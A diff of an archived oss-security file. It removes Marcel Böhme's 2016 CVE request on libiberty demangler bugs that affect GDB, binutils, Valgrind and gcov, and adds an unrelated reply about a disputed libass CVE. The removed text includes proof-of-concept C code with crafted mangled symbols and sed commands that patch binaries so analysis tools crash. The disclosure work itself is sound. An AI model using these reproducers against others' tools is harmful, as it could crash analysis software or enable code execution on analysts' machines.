@@ -1,113 +1,38 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/05/05/3
-Message-Id: <5716C1F8-38A3-4FEF-A222-AA5BDC3298F1@gmail.com>
-Date: Thu, 5 May 2016 11:12:10 +0800
-From: Marcel Böhme <boehme.marcel@...il.com>
-To: CVE ID Requests <cve-assign@...re.org>, oss-security@...ts.openwall.com
-Cc: Bernd Schmidt <bschmidt@...hat.com>, florian@...h-krohm.de, nickc@...hat.com
-Subject: CVE Request: No Demangling During Analysis of Untrusted Binaries
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/10/27/12
+Message-Id: <F5095245-3270-42FC-9FCC-91C2D121E6DC@gmail.com>
+Date: Thu, 27 Oct 2016 08:24:24 -0500
+From: Brandon Perry <bperry.volatile@...il.com>
+To: Salvatore Bonaccorso <carnil@...ian.org>
+Cc: oss-security@...ts.openwall.com, cve-assign@...re.org
+Subject: Re: Re: Handful of libass issues
 Content-Type: text/plain; charset=utf-8
 
-Hi all,
 
-Attack Vector 1: Security researchers using binary analysis tools, such as Valgrind, GDB, Binutils (e.g., objdump, nm, ..), Gcov, or other LibBFD-based tools on untrusted binaries are vulnerable to arbitrary code execution through several vulnerabilities in Libiberty, the GNU demangling library maintained by GCC. An attacker might modify a program binary such that it executes malicious code upon *analysis* (e.g., an analysis to identify whether the binary is malicious in the first place). 
+> On Oct 27, 2016, at 3:39 AM, Salvatore Bonaccorso <carnil@...ian.org> wrote:
+> 
+> Hi,
+> 
+> On Tue, Oct 04, 2016 at 10:23:22PM -0400, cve-assign@...re.org wrote:
+>>> The third is a huge memory allocation leading to a crash that wasn't
+>>> fixed because a good solution is unavailable at the moment.
+>> 
+>> Use CVE-2016-7971.
+> 
+> It looks from the discussion in
+> https://github.com/libass/libass/pull/240 that this issue is disputed
+> to be actually in libass.
+> 
 
-Attack Vector 2: Remote access / DoS via Online IDEs or demangling services.
+For context, while the input caused a crash with AFL (not fuzzing with ASAN) and it crashes with ASAN, I was unable to reproduce the crash with libass externally. I was only able to take up a hug amount of memory and take a long time to finish parsing the input.
 
-Workaround: Until the patches propagate to the vulnerable tools, switch off default demangling! E.g.,
-$ echo "set demangle-style none"  >>  ~/.gdbinit
-$ echo "--demangle=no" >> ~/.valgrindrc
+I asked if they dev wanted to reject the CVE but got no strong response either way, so I decided to not pursue it.
 
-Details and reproducers in the bug reports:
+> Should the CVE assignment be revisited, possibly rejected, according
+> the upstream discussion?
+> 
+> Regards,
+> Salvatore
 
-1) Exploitable Buffer Overflow (Fixed in GCC trunk)
-https://gcc.gnu.org/bugzilla/show_bug.cgi?id=69687
 
-2) Invalid Write due to a Use-After-Free (Fixed in GCC trunk)
-https://gcc.gnu.org/bugzilla/show_bug.cgi?id=70481
-
-3) Invalid Write due to Integer Overflow (Fixed in GCC trunk)
-https://gcc.gnu.org/bugzilla/show_bug.cgi?id=70492
-
-4) Write Access Violation (Fixed in GCC trunk)
-https://gcc.gnu.org/bugzilla/show_bug.cgi?id=70498
-
-5) Various Stack Corruptions (Patch under Review)
-https://gcc.gnu.org/bugzilla/show_bug.cgi?id=70909
-https://gcc.gnu.org/ml/gcc-patches/2016-05/threads.html#00105
-
-6) Write Access Violation (Patch under Review)
-https://gcc.gnu.org/bugzilla/show_bug.cgi?id=70926
-https://gcc.gnu.org/ml/gcc-patches/2016-05/threads.html#00223
-
-These vulnerabilities have been found with a more efficient version of the AFL fuzzer.
-A recent 12h fuzzing session on the patched version did not reveal any more security critical bugs in the demangling library.
-
-POC for PR69687
-========================
-
-** GDB and BINUTILS
-$ cat comileme.c
-#include <stdio.h>
-const char *__020A___________________X00020A___R0020A__U000R03000N99999999_020A__K000="Hello World";
-int main() {
-  printf("%s\n",__020A___________________X00020A___R0020A__U000R03000N99999999_020A__K000);
-}
-$ g++ compileme.c -o compileme
-$ ./compileme
-Hello World!
-$ gdb ./compileme
-..
-$ objdump -x -C ./compileme
-..
-$ nm -C ./compileme
-..
-
-** VALGRIND + GCOV:
-$ cat compilemetoo.c
-#include<stdio.h>
-#include<stdlib.h>
-
-const char* ____________________X00020A___R0020A__U000R03000N99999999_020A__K000(){
-  char *p;
-  p = (char *) malloc(19);
-  p = (char *) malloc(12);
-  free(p);
-  p = (char *) malloc(16);
-  return "Hello World!";
-}
-
-int main()
-{
-   printf("%s\n",____________________X00020A___R0020A__U000R03000N99999999_020A__K000());
-   return 0;
-}
-
-$ g++ compilemetoo.c -o compilemetoo
-$ sed -bi s/Z68/_20/g compilemetoo
-$ chmod u+x compilemetoo
-$ ./compilemetoo
-Hello World!
-$ valgrind --leak-check=yes ./compilemetoo
-..
-
-GCOV:
-$ g++ -fprofile-arcs -ftest-coverage compilemetoo.c -o compilemetoo
-$ sed -bi s/Z68/_20/g compilemetoo
-$ sed -bi s/Z68/_20/g compilemetoo.gcda
-$ ./compilemetoo
-Hello World!
-$ gcov --version
-gcov (GCC) 7.0.0
-$ gcov -mf compilemetoo
-..
-
-Best regards,
-- Marcel
-
----
-Marcel Böhme
-Post-doctoral Research Fellow
-TSUNAMi Security Research Center
-National University of Singapore
-
+Download attachment "signature.asc" of type "application/pgp-signature" (843 bytes)
